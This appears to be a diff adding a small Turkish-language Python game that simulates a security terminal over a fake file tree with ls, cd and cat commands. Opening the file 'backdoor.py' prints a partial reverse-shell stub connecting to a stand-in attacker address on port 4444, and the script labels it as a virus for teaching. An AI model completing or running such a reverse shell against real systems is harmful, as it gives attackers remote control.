@@ -1,0 +1,76 @@
+import os
+import time
+
+# --- SİSTEM DOSYALARI (Sanal Klasörler) ---
+sanal_sistem = {
+    "root": {
+        "kullanicilar": {
+            "mustafa": ["odev.txt", "oyunlar.lnk"],
+            "misafir": ["notlar.txt"]
+        },
+        "sistem32": {
+            "driverlar": ["ekran_karti.sys", "internet.sys"],
+            "ayarlar": ["config.inf", "güvenlik_duvari.exe"]
+        },
+        "gecici_dosyalar": ["temp1.log", "update.exe", "backdoor.py"] # HMMM?
+    }
+}
+
+def terminal_ekrani():
+    print("\n" + "="*40)
+    print("DÜKKAN GÜVENLİK TERMİNALİ v3.0")
+    print("Komutlar: 'ls' (listele), 'cd [isim]' (gir), 'cat [dosya]' (oku), 'exit'")
+    print("="*40)
+
+    su_an = "root"
+    yol = ["root"]
+
+    while True:
+        komut = input(f"C:/{'/'.join(yol)}> ").strip().lower()
+        
+        if komut == "exit":
+            break
+            
+        elif komut == "ls":
+            # Bulunduğun yerdeki dosyaları/klasörleri göster
+            hedef = sanal_sistem
+            for adim in yol:
+                hedef = hedef[adim]
+            
+            if isinstance(hedef, dict):
+                print("Klasörler/Dosyalar:", ", ".join(hedef.keys()))
+            else:
+                print("Dosya İçeriği:", hedef)
+
+        elif komut.startswith("cd "):
+            yeni_yer = komut.split(" ")[1]
+            hedef = sanal_sistem
+            for adim in yol:
+                hedef = hedef[adim]
+            
+            if yeni_yer in hedef:
+                yol.append(yeni_yer)
+            elif yeni_yer == "..":
+                if len(yol) > 1: yol.pop()
+            else:
+                print("Hata: Böyle bir klasör bulunamadı.")
+
+        elif komut.startswith("cat "):
+            dosya_adi = komut.split(" ")[1]
+            # Burada 'backdoor.py' dosyasını okursan saldırganın kodunu göreceksin!
+            if dosya_adi == "backdoor.py":
+                print("\n[TEHLİKE] Dosya İçeriği Okunuyor...")
+                time.sleep(1)
+                print(">>> import socket, subprocess")
+                print(">>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
+                print(">>> s.connect(('192.168.1.100', 4444)) # SALDIRGANIN ADRESİ!")
+                print(">>> # BU BİR REVERSE SHELL VİRÜSÜDÜR!")
+            elif dosya_adi == "odev.txt":
+                print("İçerik: Matematik ödevini bitir, LGS'ye çalış.")
+            else:
+                print("İçerik: Standart sistem dosyası.")
+        else:
+            print("Geçersiz komut.")
+
+terminal_ekrani()
+
